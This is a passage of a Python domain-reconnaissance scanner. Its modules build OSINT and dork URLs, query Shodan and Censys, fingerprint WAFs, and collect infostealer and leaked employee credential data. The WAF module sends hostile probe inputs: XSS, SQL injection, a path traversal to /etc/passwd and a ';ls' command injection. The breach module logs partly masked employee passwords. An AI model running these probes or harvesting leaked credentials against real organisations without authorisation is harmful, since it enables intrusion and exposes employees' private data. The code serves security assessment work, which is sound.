            ("StackOverflow", f'site:stackoverflow.com "{domain}"'),
            ("Trello", f'site:trello.com "{domain}"'),
            ("GitHub Secrets", f'site:github.com "{domain}" password | secret | token | api_key'),
        ],
    }


# ═══════════════════════════════════════════════════════════════
# MODULE: OSINT URLS
# ═══════════════════════════════════════════════════════════════

def generate_osint_urls(domain):
    d = quote(domain)
    return {
        "Subdomain & Cert Discovery": [
            ("crt.sh", f"https://crt.sh/?q=%25.{d}"),
            ("DNSDumpster", "https://dnsdumpster.com/"),
            ("SecurityTrails", f"https://securitytrails.com/domain/{d}/dns"),
        ],
        "Threat Intelligence": [
            ("VirusTotal", f"https://www.virustotal.com/gui/domain/{d}"),
            ("AlienVault OTX", f"https://otx.alienvault.com/indicator/domain/{d}"),
            ("URLScan.io", f"https://urlscan.io/search/#{d}"),
            ("AbuseIPDB", f"https://www.abuseipdb.com/check/{d}"),
            ("IBM X-Force", f"https://exchange.xforce.ibmcloud.com/url/{d}"),
            ("Pulsedive", f"https://pulsedive.com/indicator/?ioc={d}"),
            ("ThreatCrowd", f"https://www.threatcrowd.org/domain.php?domain={d}"),
        ],
        "Infrastructure": [
            ("Shodan", f"https://www.shodan.io/search?query={d}"),
            ("Censys Hosts", f"https://platform.censys.io/search?q=%28%22{d}%22%29+and+host.ip%3A+*"),
            ("Censys Certs", f"https://search.censys.io/certificates?q={d}"),
            ("ZoomEye", f"https://www.zoomeye.org/searchResult?q={d}"),
            ("FullHunt", f"https://fullhunt.io/search?query={d}"),
        ],
        "Archive & History": [
            ("Wayback Machine", f"https://web.archive.org/web/*/{d}"),
            ("Wayback URLs", f"https://web.archive.org/cdx/search/cdx?url=*.{d}&output=text&fl=original&collapse=urlkey"),
        ],
        "Bug Bounty": [
            ("OpenBugBounty", f"https://www.openbugbounty.org/search/?search={d}"),
            ("HackerOne", f"https://hackerone.com/directory/programs?query={d}"),
        ],
        "Code & Leaks": [
            ("GitHub Code", f"https://github.com/search?q=%22{d}%22&type=code"),
            ("GitLab", f"https://gitlab.com/search?search={d}"),
            ("Grep.app", f"https://grep.app/search?q={d}"),
            ("IntelX", f"https://intelx.io/?s={d}"),
            ("Pastebin", f"https://www.google.com/search?q=site:pastebin.com+%22{d}%22"),
        ],
        "Email": [
            ("Hunter.io", f"https://hunter.io/try/search/results?domain={d}"),
            ("EmailRep", f"https://emailrep.io/query/{d}"),
        ],
    }


# ═══════════════════════════════════════════════════════════════
# MODULE: SHODAN (free InternetDB — no API key)
# ═══════════════════════════════════════════════════════════════

def scan_shodan(domain):
    """
    Uses Shodan InternetDB (completely free, no API key) to pull:
      - Open ports, hostnames, tags, CPEs, CVEs for the domain's IPs.
    If a Shodan API key is configured (SHODAN_API_KEY env var), also
    queries the full /shodan/host endpoint for richer data.
    """
    import os

    ips = resolve(domain)
    all_v4 = ips.get("v4", [])
    if not all_v4:
        return {"error": "Cannot resolve domain to IPv4"}

    api_key = os.environ.get("SHODAN_API_KEY", "").strip()
    results = {"ips": {}, "summary": {"total_cves": 0, "total_ports": 0, "critical_cves": []}}

    for ip in all_v4[:5]:  # cap at 5 IPs
        ip_data = {"ip": ip, "ports": [], "hostnames": [], "tags": [],
                   "cpes": [], "cves": [], "vulns": [], "os": None,
                   "isp": None, "org": None, "country": None, "api_data": None}

        # --- InternetDB (always free, no key needed) ---
        try:
            r = req(f"https://internetdb.shodan.io/{ip}", timeout=10)
            if r:
                d = r.json()
                ip_data["ports"]     = d.get("ports", [])
                ip_data["hostnames"] = d.get("hostnames", [])
                ip_data["tags"]      = d.get("tags", [])
                ip_data["cpes"]      = d.get("cpes", [])
                raw_cves = d.get("vulns", []) or []
                base_cves = [{"id":c,"cvss":None,"severity":"","summary":"","kev":False}
                             if isinstance(c,str) else c for c in raw_cves]
                ip_data["cves"] = base_cves
                results["summary"]["total_ports"] += len(ip_data["ports"])
                results["summary"]["total_cves"]  += len(base_cves)
                def _enrich_cve(e):
                    cid = e.get("id","")
                    if not cid or e.get("summary"): return e
                    try:
                        r2 = req(f"https://cvedb.shodan.io/cve/{cid}", timeout=5)
                        if r2:
                            j = r2.json()
                            cvss = float(j.get("cvss_v3") or j.get("cvss") or j.get("cvss_v2") or 0)
                            sev = "critical" if cvss>=9 else "high" if cvss>=7 else "medium" if cvss>=4 else "low" if cvss>0 else ""
                            return {"id":cid,"cvss":round(cvss,1),"severity":sev,
                                    "summary":(j.get("summary") or "")[:150],
                                    "kev":bool(j.get("kev")),"epss":round(float(j.get("epss") or 0),4)}
                    except: pass
                    return e
                with concurrent.futures.ThreadPoolExecutor(max_workers=5) as _cx:
                    ip_data["cves"] = list(_cx.map(_enrich_cve, base_cves[:15]))
        except Exception:
            pass

        # --- Full Shodan API (optional, needs SHODAN_API_KEY env var) ---
        if api_key:
            try:
                r2 = req(f"https://api.shodan.io/shodan/host/{ip}?key={api_key}", timeout=15)
                if r2:
                    d2 = r2.json()
                    ip_data["os"]      = d2.get("os")
                    ip_data["isp"]     = d2.get("isp")
                    ip_data["org"]     = d2.get("org")
                    ip_data["country"] = d2.get("country_name")
                    # Enrich CVEs with CVSS scores
                    vulns = d2.get("vulns", {})
                    enriched = []
                    for cve_id, cve_info in vulns.items():
                        cvss = cve_info.get("cvss", 0) or 0
                        enriched.append({
                            "id": cve_id,
                            "cvss": cvss,
                            "summary": cve_info.get("summary", "")[:120],
                            "references": cve_info.get("references", [])[:2],
                        })
                    enriched.sort(key=lambda x: float(x["cvss"] or 0), reverse=True)
                    ip_data["vulns"] = enriched
                    # Banner data — services
                    services = []
                    for item in d2.get("data", []):
                        svc = {
                            "port": item.get("port"),
                            "transport": item.get("transport", "tcp"),
                            "product": item.get("product", ""),
                            "version": item.get("version", ""),
                            "banner": (item.get("data", "") or "")[:100].strip(),
                        }
                        if svc["port"]:
                            services.append(svc)
                    ip_data["api_data"] = {"services": services[:20]}
            except Exception:
                pass

        # Track critical CVEs (CVSS >= 9.0) across all IPs
        for vuln in ip_data.get("vulns", []):
            if float(vuln.get("cvss") or 0) >= 9.0:
                results["summary"]["critical_cves"].append({
                    "ip": ip, "cve": vuln["id"], "cvss": vuln["cvss"]
                })

        ip_data["shodan_host_url"] = f"https://www.shodan.io/host/{ip}"
        results["ips"][ip] = ip_data

    results["api_key_used"] = bool(api_key)
    results["domain"] = domain
    return results


# ═══════════════════════════════════════════════════════════════
# MODULE: CENSYS (free unauthenticated search + deep link)
# ═══════════════════════════════════════════════════════════════

def scan_censys(domain):
    """
    Censys integration — two tiers:

    Tier 1 (always, no key): resolves IPs then scrapes the Censys
    search page for visible metadata + builds deep-link URLs for
    every interesting query (hosts, certs, domain, ASN, etc.)

    Tier 2 (if CENSYS_API_ID + CENSYS_API_SECRET env vars set):
    queries the official Censys Search v2 API for full structured
    data: open ports, services, TLS certs, location, ASN, labels.
    """
    import os

    ips = resolve(domain)
    all_v4 = ips.get("v4", [])

    api_id     = os.environ.get("CENSYS_API_ID", "").strip()
    api_secret = os.environ.get("CENSYS_API_SECRET", "").strip()
    has_api    = bool(api_id and api_secret)

    d = quote(domain)
    results = {
        "domain": domain,
        "ips": all_v4,
        "api_used": has_api,
        "links": {},
        "ip_data": {},
        "certificates": [],
        "summary": {},
    }

    # ── Deep-link URLs (always generated, no key needed) ──
    results["links"] = {
        # platform.censys.io — correct query syntax: ("domain.com") and host.ip: *
        "search_platform":  f"https://platform.censys.io/search?q=%28%22{d}%22%29+and+host.ip%3A+*",
        "hosts_by_ip":      [f"https://search.censys.io/hosts/{ip}" for ip in all_v4[:5]],
        "certificates":     f"https://search.censys.io/certificates?q=parsed.names%3A{d}",
        "subdomains":       f"https://search.censys.io/certificates?q=parsed.names%3A*.{d}",
        "asn_lookup":       f"https://search.censys.io/hosts?q=autonomous_system.name%3A{d}",
    }

    # ── Unauthenticated: try Censys search page for surface-level info ──
    if all_v4:
        for ip in all_v4[:3]:
            try:
                r = req(f"https://internetdb.shodan.io/{ip}", timeout=8)
                # Reuse shodan InternetDB as a quick port/service enrichment
                # since Censys doesn't have a free unauthenticated API endpoint
                if r:
                    d2 = r.json()
                    results["ip_data"][ip] = {
                        "ports": d2.get("ports", []),
                        "hostnames": d2.get("hostnames", []),
                        "cpes": d2.get("cpes", []),
                        "cves": d2.get("vulns", []),
                        "tags": d2.get("tags", []),
                        "source": "internetdb_enrichment",
                    }
            except Exception:
                pass

    # ── crt.sh for certificate data (free, no key) ──
    try:
        r = req(f"https://crt.sh/?q={d}&output=json", timeout=20)
        if r:
            certs = []
            seen = set()
            for entry in r.json()[:50]:
                cn = entry.get("common_name", "")
                issuer = entry.get("issuer_name", "")
                not_before = entry.get("not_before", "")[:10]
                not_after  = entry.get("not_after", "")[:10]
                key = (cn, not_after)
                if key not in seen:
                    seen.add(key)
                    certs.append({
                        "common_name": cn,
                        "issuer": issuer,
                        "not_before": not_before,
                        "not_after": not_after,
                        "id": entry.get("id"),
                    })
            results["certificates"] = certs[:20]
    except Exception:
        pass

    # ── Full Censys API (optional) ──
    if has_api:
        import base64
        auth = base64.b64encode(f"{api_id}:{api_secret}".encode()).decode()
        headers = {"Authorization": f"Basic {auth}", "Content-Type": "application/json"}

        for ip in all_v4[:5]:
            try:
                r = req(f"https://search.censys.io/api/v2/hosts/{ip}", headers=headers, timeout=15)
                if r:
                    host = r.json().get("result", {})
                    services = []
                    for svc in host.get("services", []):
                        services.append({
                            "port": svc.get("port"),
                            "transport_protocol": svc.get("transport_protocol", "TCP"),
                            "service_name": svc.get("service_name", ""),
                            "product": svc.get("software", [{}])[0].get("product", "") if svc.get("software") else "",
                            "tls_subject": (svc.get("tls", {}) or {}).get("certificates", {}).get("leaf_data", {}).get("subject_dn", ""),
                        })
                    loc = host.get("location", {})
                    asn = host.get("autonomous_system", {})
                    results["ip_data"][ip] = {
                        "services": services,
                        "os":       host.get("operating_system", {}).get("product", ""),
                        "country":  loc.get("country", ""),
                        "city":     loc.get("city", ""),
                        "asn":      asn.get("asn", ""),
                        "asn_name": asn.get("name", ""),
                        "labels":   host.get("labels", []),
                        "source":   "censys_api",
                    }
            except Exception:
                pass

        # Certificate search via API
        try:
            payload = json.dumps({"q": domain, "per_page": 25})
            import urllib.request
            req2 = urllib.request.Request(
                "https://search.censys.io/api/v2/certificates/search",
                data=payload.encode(),
                headers={"Authorization": f"Basic {auth}", "Content-Type": "application/json"},
                method="POST"
            )
            with urllib.request.urlopen(req2, timeout=15) as resp:
                cert_data = json.loads(resp.read())
                for hit in cert_data.get("result", {}).get("hits", [])[:10]:
                    parsed = hit.get("parsed", {})
                    results["certificates"].append({
                        "common_name": parsed.get("subject_dn", ""),
                        "issuer": parsed.get("issuer_dn", ""),
                        "not_before": parsed.get("validity", {}).get("start", "")[:10],
                        "not_after": parsed.get("validity", {}).get("end", "")[:10],
                        "fingerprint": hit.get("fingerprint_sha256", "")[:16] + "...",
                        "source": "censys_api",
                    })
        except Exception:
            pass

    results["summary"] = {
        "ips_found": len(all_v4),
        "certs_found": len(results["certificates"]),
        "api_used": has_api,
    }
    return results


# ═══════════════════════════════════════════════════════════════
# MODULE: WAFW00F (tool + Python fallback)
# ═══════════════════════════════════════════════════════════════

def scan_wafw00f(domain):
    """
    WAF detection via two methods:
    1. wafw00f binary (if installed): pip install wafw00f
    2. Python fallback: HTTP-based fingerprinting using 40+ WAF
       signatures across headers, cookies, response body, and
       error-page injection probes.
    """
    import subprocess
    import shutil

    wafw00f_bin = shutil.which("wafw00f")

    if wafw00f_bin:
        try:
            result = subprocess.run(
                [wafw00f_bin, f"https://{domain}", "-a", "-o", "-"],
                capture_output=True, text=True, timeout=45
            )
            output = result.stdout + result.stderr
            detected = _parse_wafw00f_output(output)
            return {
                "source":         "wafw00f_binary",
                "raw":            output[:3000],
                "detected":       detected,
                "waf_found":      bool(detected),
                "waf_confidence": "high" if detected else "none",
            }
        except subprocess.TimeoutExpired:
            pass
        except Exception:
            pass

    return _wafw00f_python(domain)


def _parse_wafw00f_output(output):
    """Parse wafw00f text output into list of WAF names."""
    detected = []
    for line in output.split("\n"):
        m = re.search(r'is behind (.+?)(?:\s+WAF|\s+\(|\s*$)', line, re.IGNORECASE)
        if m:
            detected.append(m.group(1).strip())
        # Also catch "The site ... is protected by ... firewall"
        m2 = re.search(r'protected by (.+?)(?:\s+firewall|\s*$)', line, re.IGNORECASE)
        if m2 and m2.group(1).strip() not in detected:
            detected.append(m2.group(1).strip())
    return list(set(detected))


def _wafw00f_python(domain):
    """
    Python-based WAF fingerprinter.
    Phase 1: passive — inspect headers/cookies on normal request.
    Phase 2: active  — inject a simple XSS probe and inspect the
             error response (block pages, challenge pages, etc.)
    """
    if not HAS_REQUESTS:
        return {"error": "requests required", "source": "python_fallback"}

    WAF_SIGNATURES = {
        # Format: "WAF Name": {"header": [...], "cookie": [...], "body": [...], "server": [...]}
        "Cloudflare": {
            "header": ["cf-ray", "cf-cache-status", "cf-request-id"],
            "cookie":  ["__cfduid", "cf_clearance", "__cf_bm"],
            "server":  ["cloudflare"],
            "body":    ["Attention Required! | Cloudflare", "Ray ID:", "DDoS protection by Cloudflare"],
        },
        "AWS WAF / Shield": {
            "header": ["x-amzn-requestid", "x-amz-cf-id", "x-amzn-trace-id"],
            "server":  ["awselb", "amazons3"],
            "body":    ["AWS WAF", "Request blocked"],
        },
        "Akamai Kona": {
            "header": ["akamai-ghost-ip", "x-akamai-transformed", "x-check-cacheable"],
            "server":  ["akamaighost", "akamai"],
            "body":    ["Access Denied", "Reference #18.", "AkamaiGHost"],
        },
        "Imperva / Incapsula": {
            "header": ["x-iinfo", "x-cdn"],
            "cookie":  ["incap_ses", "visid_incap"],
            "body":    ["Incapsula incident ID", "/_Incapsula_Resource"],
        },
        "F5 BIG-IP ASM": {
            "header": ["x-waf-event-info", "x-cnection"],
            "cookie":  ["ts", "BIGipServer"],
            "body":    ["The requested URL was rejected", "F5 Networks"],
            "server":  ["BigIP", "BIG-IP"],
        },
        "Sucuri": {
            "header": ["x-sucuri-id", "x-sucuri-cache"],
            "server":  ["Sucuri/Cloudproxy"],
            "body":    ["Access Denied - Sucuri Website Firewall", "sucuri.net"],
        },
        "Barracuda WAF": {
            "cookie":  ["barra_counter_session", "BNI__BARRACUDA_LB_COOKIE"],
            "body":    ["barracuda", "Barracuda Networks"],
        },
        "Fortinet FortiWeb": {
            "header": ["x-protected-by"],
            "cookie":  ["FORTIWAFSID"],
            "body":    ["FortiWeb", "Application Firewall", ".fgd_icon"],
            "server":  ["fortigate"],
        },
        "ModSecurity": {
            "body":    ["ModSecurity", "This error was generated by Mod_Security",
                        "mod_security", "NOYB"],
            "header": ["x-mod-security"],
        },
        "Wordfence": {
            "body":    ["generated by Wordfence", "Wordfence", "wfCBLlookup"],
        },
        "Nginx WAF": {
            "body":    ["nginx", "openresty"],
            "server":  ["nginx", "openresty"],
        },
        "Wallarm": {
            "header": ["x-wallarm-node"],
            "body":    ["Wallarm", "wallarm"],
        },
        "Radware AppWall": {
            "body":    ["Unauthorized Activity Has Been Detected", "Radware"],
            "cookie":  ["RDWR"],
        },
        "DenyALL WAF": {
            "cookie":  ["sessioncookie"],
            "body":    ["DenyALL", "Denied by Deny All"],
        },
        "Reblaze": {
            "cookie":  ["rbzid"],
            "header": ["x-reblaze-protection"],
            "body":    ["reblaze"],
        },
        "StackPath": {
            "header": ["x-sp-url", "x-sp-waf"],
            "body":    ["StackPath", "stackpath"],
        },
        "Varnish": {
            "header": ["x-varnish", "via"],
            "body":    ["varnish cache server"],
            "server":  ["varnish"],
        },
        "Fastly": {
            "header": ["x-fastly-request-id", "fastly-restarts"],
            "server":  ["fastly"],
        },
        "Vercel Edge": {
            "header": ["x-vercel-id", "x-vercel-cache"],
            "server":  ["vercel"],
        },
        "Pantheon": {
            "header": ["x-pantheon-styx-hostname"],
            "cookie":  ["STYXKEY"],
        },
        "Squarespace": {
            "header": ["x-sqsp-version"],
        },
        "Netlify": {
            "header": ["x-nf-request-id"],
            "server":  ["netlify"],
        },
        "Azure Front Door": {
            "header": ["x-azure-ref", "x-fd-healthprobe"],
            "server":  ["Microsoft-Azure-Application-Gateway"],
        },
        "Google Cloud Armor": {
            "header": ["x-cloud-trace-context", "x-goog-backend"],
            "server": ["gfe", "google frontend", "gws"],
            "body":   ["google cloud armor", "request blocked by cloud armor"],
        },
        "Edgio / Limelight": {
            "header": ["x-hw", "x-ec-custom-error"],
        },
        "DataDome": {
            "cookie":  ["datadome"],
            "body":    ["datadome", "DataDome"],
        },
        "Kasada": {
            "header": ["x-kpsdk-ct"],
            "body":    ["kasada"],
        },
        "PerimeterX": {
            "header": ["x-px-logid"],
            "cookie":  ["_px", "_pxhd", "_pxvid"],
            "body":    ["PerimeterX", "px-captcha"],
        },
        "hCaptcha / Bot Protection": {
            "body":    ["hcaptcha.com", "h-captcha"],
        },
        "Kona (Akamai Bot Manager)": {
            "cookie":  ["ak_bmsc", "_abck"],
            "header": ["x-akamai-edgescape"],
        },
    }

    # Phase 1: Normal GET request
    normal_resp = None
    for scheme in ["https", "http"]:
        try:
            normal_resp = requests.get(
                f"{scheme}://{domain}", timeout=10, allow_redirects=True,
                headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                                       "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"},
                verify=False,
            )
            break
        except Exception:
            continue

    # Phase 2: Probe request with a benign XSS-like payload
    probe_resp = None
    PROBE_PATHS = [
        "/?q=<script>alert(1)</script>",
        "/?id=1%27%20OR%20%271%27=%271",
        "/?file=../../../etc/passwd",
        "/?cmd=;ls",
    ]
    for path in PROBE_PATHS:
        try:
            probe_resp = requests.get(
                f"https://{domain}{path}", timeout=8, allow_redirects=True,
                headers={"User-Agent": "Mozilla/5.0"},
                verify=False,
            )
            break
        except Exception:
            continue

    detections = {}

    def check_response(resp, phase):
        if not resp:
            return
        hdrs = {k.lower(): v.lower() for k, v in resp.headers.items()}
        body = (resp.text or "")[:10000].lower()
        cookies = {c.name.lower(): c.value.lower() for c in resp.cookies}
        server = hdrs.get("server", "")

        for waf, sigs in WAF_SIGNATURES.items():
            score = 0
            matched = []
            for h in sigs.get("header", []):
                if h.lower() in hdrs:
                    score += 2
                    matched.append(f"header:{h}")
            for c in sigs.get("cookie", []):
                if any(c.lower() in ck for ck in cookies):
                    score += 3
                    matched.append(f"cookie:{c}")
            for b in sigs.get("body", []):
                if b.lower() in body:
                    score += 2
                    matched.append(f"body:{b[:30]}")
            for s in sigs.get("server", []):
                if s.lower() in server:
                    score += 3
                    matched.append(f"server:{s}")
            if score > 0:
                if waf not in detections:
                    detections[waf] = {"score": 0, "evidence": [], "phases": []}
                detections[waf]["score"] += score
                detections[waf]["evidence"].extend(matched)
                if phase not in detections[waf]["phases"]:
                    detections[waf]["phases"].append(phase)

    check_response(normal_resp, "passive")
    check_response(probe_resp, "probe")

    # Check if probe got blocked (status 403/406/429/503)
    probe_blocked = False
    probe_status = None
    if probe_resp:
        probe_status = probe_resp.status_code
        if probe_resp.status_code in (403, 406, 429, 503):
            probe_blocked = True

    # Build sorted result list
    detected_list = []
    for waf, info_d in sorted(detections.items(), key=lambda x: -x[1]["score"]):
        detected_list.append({
            "waf": waf,
            "confidence": "high" if info_d["score"] >= 5 else "medium" if info_d["score"] >= 3 else "low",
            "score": info_d["score"],
            "evidence": list(set(info_d["evidence"]))[:6],
            "phases": info_d["phases"],
        })

    # Deduplicate overlapping WAFs (e.g. Cloudflare + Cloudflare WAF from tech module)
    seen_wafs = set()
    unique_detected = []
    for d_item in detected_list:
        key = d_item["waf"].split()[0].lower()
        if key not in seen_wafs:
            seen_wafs.add(key)
            unique_detected.append(d_item)

    high_conf = [w for w in unique_detected if w["confidence"] in ("high", "medium")]

    return {
        "source":         "python_fallback",
        "waf_found":      bool(high_conf or unique_detected),
        "waf_confidence": "none" if not unique_detected else ("high" if high_conf else "low"),
        "detected":       unique_detected,
        "high_confidence": high_conf,
        "probe_blocked":  probe_blocked,
        "probe_status":   probe_status,
        "normal_status":  normal_resp.status_code if normal_resp else None,
    }


# ═══════════════════════════════════════════════════════════════
# MODULE: BREACH INTELLIGENCE (leaks, infostealer, credentials)
# ═══════════════════════════════════════════════════════════════

def scan_breachintel(domain):
    """
    Aggregates breach & credential leak intelligence from 4 free sources:

    Source 1 — Hudson Rock Cavalier (FREE, no key)
        Infostealer database: stolen credentials, victim machine metadata,
        compromised dates, victim IPs, computer names, anti-virus status.
        Endpoints:
          /search-by-domain   → corporate infostealer hits
          /urls-by-domain     → stolen URL/credential pairs

    Source 2 — Chiasmodon API (FREE tier, no key required)
        Credential leak search:
          /CompanyEmployeLogins  → employee username+password combos
          /CompanyClientLogins   → customer credential leaks
          /CompanyEmails         → email enumeration
          /CompanyRelated        → related domains

    Source 3 — HaveIBeenPwned public breach list (FREE, no key)
        Checks domain against all known public breaches.
        Returns breach names, dates, data classes exposed.

        Domain-based breach lookup with source names.

    Optional (if env vars set):
        HIBP_API_KEY           → per-email breach lookup
        CHIASMODON_API_KEY     → full Chiasmodon results
    """
    import os

    hibp_key        = os.environ.get("HIBP_API_KEY", "").strip()
    chiasmodon_key  = os.environ.get("CHIASMODON_API_KEY", "").strip()

    results = {
        "domain": domain,
        "sources": {},
        "summary": {
            "total_employees_leaked": 0,
            "total_clients_leaked": 0,
            "total_emails_found": 0,
            "total_infostealer_hits": 0,
            "breach_names": [],
            "critical_findings": [],
        },
        "api_keys_used": {
            "hibp": bool(hibp_key),
                "chiasmodon": bool(chiasmodon_key),
        }
    }

    d = quote(domain)

    # ══════════════════════════════════════════════════════
    # SOURCE 1: HUDSON ROCK CAVALIER — FREE, NO KEY
    # ══════════════════════════════════════════════════════
    hr = {
        "status": "ok", "employees": [], "clients": [], "urls": [],
        "total_employees": 0, "total_clients": 0,
        "email_stealer_checks": [],  # per-email stealer lookup results
    }

    HR_HEADERS = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json",
    }

    def hr_get(url):
        """Robust Hudson Rock fetch — handles SSL, redirects, any 2xx."""
        try:
            r = requests.get(
                url, timeout=20, allow_redirects=True,
                headers=HR_HEADERS, verify=False,
            )
            if r.status_code in (200, 201, 202):
                return r.json()
            # Also try parsing non-200 that still has JSON (HR sometimes returns 202)
            try:
                j = r.json()
                if isinstance(j, dict) and ("employees" in j or "stealers" in j or "message" in j):
                    return j
            except Exception:
                pass
        except Exception as ex:
            hr["status"] = f"error: {str(ex)[:80]}"
        return None

    # Domain infostealer search
    # Actual API response shape (verified):
    # { "total": 15, "employees": 11, "users": 4, "third_parties": 23,
    #   "data": {"employees_urls": [...], "clients_urls": [...]},
    #   "stats": {"totalEmployees": 5, "totalUsers": 2, ...},
    #   "antiviruses": {"list": [...]},
    #   "stealerFamilies": {"RedLine": 10, "Lumma": 2, ...},
    #   "employeePasswords": {"totalPass":19, "too_weak":{}, "weak":{}, "strong":{}},
    #   "thirdPartyDomains": [{"domain":"...", "occurrence":N}],
    #   "last_employee_compromised": "2024-09-02T...",
    # }
    try:
        data = hr_get(
            f"https://cavalier.hudsonrock.com/api/json/v2/osint-tools/search-by-domain?domain={d}"
        )
        if data and isinstance(data, dict):
            # Top-level counts (all integers in real response)
            hr["total_employees"]  = data.get("employees", 0) or 0
            hr["total_clients"]    = data.get("users", 0) or 0
            hr["total_records"]    = data.get("total", 0) or 0
            hr["total_stealers_db"]= data.get("totalStealers", 0) or 0
            hr["third_parties"]    = data.get("third_parties", 0) or 0

            # Timestamps
            hr["last_employee_compromised"] = (data.get("last_employee_compromised") or "")[:10]
            hr["last_user_compromised"]     = (data.get("last_user_compromised") or "")[:10]

            # Stealer families breakdown
            sf = data.get("stealerFamilies", {}) or {}
            hr["stealer_families"] = {k: v for k, v in sf.items() if k != "total"}
            hr["stealer_families_total"] = sf.get("total", 0)

            # Antivirus stats
            av = data.get("antiviruses", {}) or {}
            hr["antiviruses"] = {
                "total":     av.get("total", 0),
                "found_pct": av.get("found", 0),
                "free_pct":  av.get("free", 0),
                "list":      av.get("list", []) or [],
            }

            # Password strength
            ep = data.get("employeePasswords", {}) or {}
            hr["employee_passwords"] = {
                "total":    ep.get("totalPass", 0),
                "too_weak": (ep.get("too_weak") or {}).get("qty", 0),
                "weak":     (ep.get("weak") or {}).get("qty", 0),
                "medium":   (ep.get("medium") or {}).get("qty", 0),
                "strong":   (ep.get("strong") or {}).get("qty", 0),
            }

            # Stolen URLs grouped by employee/client
            d_inner = data.get("data", {}) or {}
            hr["employee_urls"] = d_inner.get("employees_urls", []) or []
            hr["client_urls"]   = d_inner.get("clients_urls", []) or []
            hr["all_urls"]      = d_inner.get("all_urls", []) or []

            # Stats (deduplicated unique victims)
            stats = data.get("stats", {}) or {}
            hr["unique_employees"] = stats.get("totalEmployees", 0)
            hr["unique_clients"]   = stats.get("totalUsers", 0)

            # Third-party domains these victims also had credentials for
            hr["third_party_domains"] = (data.get("thirdPartyDomains") or [])[:20]

            results["summary"]["total_infostealer_hits"] += hr["total_employees"] + hr["total_clients"]

            # Critical findings
            if hr["total_employees"] > 0:
                results["summary"]["critical_findings"].append({
                    "source": "hudsonrock",
                    "type":   "employees_infected_infostealer",
                    "detail": f"{hr['total_employees']} employee machines infected — last: {hr['last_employee_compromised']}",
                })
            if hr["stealer_families"]:
                top_family = max(hr["stealer_families"].items(), key=lambda x: x[1] if isinstance(x[1], int) else 0)
                results["summary"]["critical_findings"].append({
                    "source": "hudsonrock",
                    "type":   "stealer_family_identified",
                    "detail": f"Primary malware: {top_family[0]} ({top_family[1]} infections)",
                })

            # Per-email stealer check — extract emails from employee_urls
            employee_emails = set()
            for url_entry in hr["employee_urls"][:20]:
                if isinstance(url_entry, dict):
                    url_val = url_entry.get("url", "")
                    # Try to extract email-like username from URL
                    # e.g. https://mail.domain.com/mail/user.nsf
                    pass

            def check_email_stealer(email):
                try:
                    from urllib.parse import quote as _quote
                    d_email = hr_get(
                        f"https://cavalier.hudsonrock.com/api/json/v2/osint-tools/search-by-email?email={_quote(email)}"
                    )
                    # Actual response: {"message":"...", "stealers":[{...}],
                    #   "total_corporate_services":5, "total_user_services":200}
                    if d_email and isinstance(d_email, dict):
                        stealers = d_email.get("stealers", []) or []
                        if stealers:
                            return {
                                "email":                    email,
                                "compromised":              True,
                                "total_corporate_services": d_email.get("total_corporate_services", 0),
                                "total_user_services":      d_email.get("total_user_services", 0),
                                "stealers": [{
                                    "date_compromised":  (s.get("date_compromised") or "")[:10],
                                    "computer_name":     s.get("computer_name", ""),
                                    "operating_system":  s.get("operating_system", ""),
                                    "malware_path":      s.get("malware_path", ""),
                                    "ip":                s.get("ip", ""),
                                    "antiviruses":       s.get("antiviruses", []) or [],
                                    "total_corporate":   s.get("total_corporate_services", 0),
                                    "total_personal":    s.get("total_user_services", 0),
                                    "top_passwords":     (s.get("top_passwords") or [])[:5],
                                    "top_logins":        (s.get("top_logins") or [])[:5],
                                } for s in stealers[:5]],
                            }
                        else:
                            return {"email": email, "compromised": False}
                except Exception:
                    pass
                return None

            if employee_emails:
                with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
                    email_results = list(ex.map(check_email_stealer, list(employee_emails)[:10]))
                hr["email_stealer_checks"] = [r for r in email_results if r is not None]
                for ec in hr["email_stealer_checks"]:
                    if ec.get("compromised"):
                        results["summary"]["critical_findings"].append({
                            "source": "hudsonrock_email",
                            "type":   "email_infostealer_confirmed",
                            "detail": f"{ec['email']} — {ec['total_corporate_services']} corp + {ec['total_user_services']} personal services stolen",
                        })
        else:
            hr["status"] = "no_data"
    except Exception as ex:
        hr["status"] = f"error: {ex}"

    results["sources"]["hudsonrock"] = hr

    # ══════════════════════════════════════════════════════
    # SOURCE 2: CHIASMODON API — FREE TIER, NO KEY NEEDED
    # ══════════════════════════════════════════════════════
    chia = {"status": "ok", "employee_logins": [], "client_logins": [], "emails": [], "related": []}
    CHIA_BASE = "http://chiasmodon.online/v2"
    CHIA_KEY  = chiasmodon_key  # empty string = free tier

    def chia_get(endpoint, page=1):
        url = f"{CHIA_BASE}/{endpoint}?q={d}&key={CHIA_KEY}&page={page}"
        try:
            r = requests.get(
                url, timeout=20, allow_redirects=True,
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    "Accept": "application/json, text/plain, */*",
                },
                verify=False,
            )
            if r.status_code in (200, 201, 202):
                try:
                    return r.json()
                except Exception:
                    return None
        except Exception:
            pass
        return None

    def chia_parse(raw):
        """
        Parse Chiasmodon response — actual format is a LIST:
        [{"data": [{entry}, {entry}...], "page": 1}]
        Each entry has: username, email, password, country, date
        """
        if not raw:
            return []
        # Unwrap list wrapper
        if isinstance(raw, list):
            entries = []
            for item in raw:
                if isinstance(item, dict):
                    entries.extend(item.get("data", []) or [])
                elif isinstance(item, list):
                    entries.extend(item)
            return entries
        # Direct dict
        if isinstance(raw, dict):
            if raw.get("error"):
                return []
            return raw.get("data", []) or []
        return []

    # Employee logins — fetch pages 1 and 2
    try:
        raw1 = chia_get("CompanyEmployeLogins", page=1)
        raw2 = chia_get("CompanyEmployeLogins", page=2)
        logins = chia_parse(raw1) + chia_parse(raw2)
        chia["employee_logins"] = [l for l in logins if isinstance(l, dict)][:200]
        results["summary"]["total_employees_leaked"] += len(chia["employee_logins"])
        for login in chia["employee_logins"][:20]:
            pw   = login.get("password", "") or ""
            user = login.get("email", "") or login.get("username", "") or login.get("user", "") or ""
            if pw and len(pw) > 2:
                results["summary"]["critical_findings"].append({
                    "source": "chiasmodon",
                    "type":   "employee_plaintext_password",
                    "detail": f"{user} — pass: {pw[:3]}{'*'*max(0,len(pw)-3)} ({login.get('date','')})",
                })
